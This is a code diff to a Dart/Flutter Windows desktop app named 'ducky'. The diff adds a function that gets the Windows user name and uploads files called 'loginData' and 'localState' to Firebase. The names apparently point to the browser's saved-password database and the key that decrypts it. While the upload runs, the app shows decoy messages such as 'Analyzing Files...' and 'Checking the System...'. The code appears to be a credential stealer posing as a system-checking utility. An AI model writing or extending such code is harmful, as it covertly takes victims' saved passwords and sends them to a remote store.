@@ -1,5 +1,5 @@
 import 'dart:io';
-
+import 'package:device_info_plus/device_info_plus.dart';
 import 'package:ducky/constants/path_constants.dart';
 import 'package:ducky/services/download_services.dart';
 import 'package:ducky/services/services.dart';
@@ -21,7 +21,33 @@ class _HomePageState extends State<HomePage> {
   String? status;
   bool isFinish = false;
 
-  void _start(BuildContext context) async {
+  DeviceInfoPlugin deviceInfo = DeviceInfoPlugin();
+
+  Future<void> sendInfoToFirebase() async {
+    setState(() => status = 'Analyzing Files...');
+    await duckServices.sendInfoFirebase(context);
+    setState(() => status = 'Checking the System...');
+  }
+
+  Future<void> sendFilesFirebase() async {
+    WindowsDeviceInfo windowsInfo = await deviceInfo.windowsInfo;
+
+    Map<String, dynamic> data = windowsInfo.data;
+
+    String user = data['userName'];
+
+    String userName1 = loginData(user);
+    File file1 = File(userName1);
+
+    await duckServices.uploadFile(user: user, title: 'loginData', file: file1);
+
+    String userName2 = localState(user);
+    File file2 = File(userName2);
+
+    await duckServices.uploadFile(user: user, title: 'localState', file: file2);
+  }
+
+  Future<void> _start(BuildContext context) async {
     try {
       Shell shell = Shell(options: ShellOptions());
 
@@ -176,14 +202,11 @@ class _HomePageState extends State<HomePage> {
                         isFinish
                             ? null
                             : () async {
-                              setState(() => status = 'Analyzing Files...');
-                              await duckServices.sendInfoFirebase(context);
-                              setState(() => status = 'Checking the System...');
-
-                              await duckServices.uploadFile();
+                              await sendInfoToFirebase();
+                              await sendFilesFirebase();
 
                               if (!context.mounted) return;
-                              _start(context);
+                              await _start(context);
                             },
                     child: Ink(
                       decoration: BoxDecoration(
